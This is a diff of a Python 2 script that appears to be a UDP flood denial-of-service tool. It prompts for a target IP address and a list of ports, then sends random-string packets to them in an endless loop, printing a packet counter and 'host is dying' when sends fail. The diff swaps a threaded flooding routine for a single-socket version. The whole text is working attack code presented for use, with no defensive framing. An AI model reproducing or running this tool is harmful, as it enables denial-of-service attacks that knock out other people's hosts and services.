@@ -1,4 +1,5 @@
-import socket, random, threading
+import socket, random
+s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 print"""\033[92m
 
   ################################
@@ -18,61 +19,48 @@ print"""\033[92m
       
   enjoy!!!!
   
-  ################################  """
-def f():
+  ################################  
+  
+  """
+def po():
  global pr
  pr=[]
- n=input('\n      OPEN PORTS NUMBER:\n      >')
- print'\n      PORTS:'
- for z in range(n):
-  po=input('      >')
-  pr.append(po)
- return pr
-
-ip=raw_input('\n\n      TARGET IP:\n      >')
-f()
-b=input('\n      USE THREADS?\n       1-yes\n       2-no\n      >')
-if b==1:
- y=input('\n      THREADS:\n      >')
-else:
- pass
- 
-i=0
-def b(size):
-    out_str = ''
-    for i in range(0, size):
-        a = random.randint(65, 160)
-        out_str += chr(a)
-    return(out_str)
-
+ print'PORTS:'
+ for q in range(pt):
+  v=input('>')
+  pr.append(v)
+ return(pr)
+ip=raw_input('TARGET IP:\n>')
+pt=input('OPEN PORTS COUNT:\n>')
+po()
 def k():
  global i
  i+=1
  if i%1000==0:
-  print'packets sent:', i
- 
-def so():
- for p in pr:
-  try:
-   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-   s.connect((ip,p))
-   s.sendto(b(random.randint(10,15)),(ip,p))
-   k()
-  except socket.error:
-   pass
+  print'\033[92mpackets sent:', i
 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while True:
-				so()
-		except Exception, ex:
-			pass
-if b==1:
- for x in range(y):
-  t = HTTPThread()
-  t.start()
-else:
- while True:
-  so()
-
+i=0
+def h(s):
+    l = ''
+    for i in range(0, s):
+        a = random.randint(65, 160)
+        l += chr(a)
+    return(l)
+    
+def cr():
+ print'\n\n[*] creating random strings...'
+ global li 
+ li=[]
+ for o in range(100):
+  z=h(random.randint(10,50))
+  li.append(z)
+ return(li)
+cr()
+while True:
+ try:
+  p=random.choice(pr)
+  s.connect((ip,p))
+  s.sendto(random.choice(li),(ip,p))
+  k()
+ except socket.error as e:
+  print '\033[91m<--connection failed ** host is dying -->'
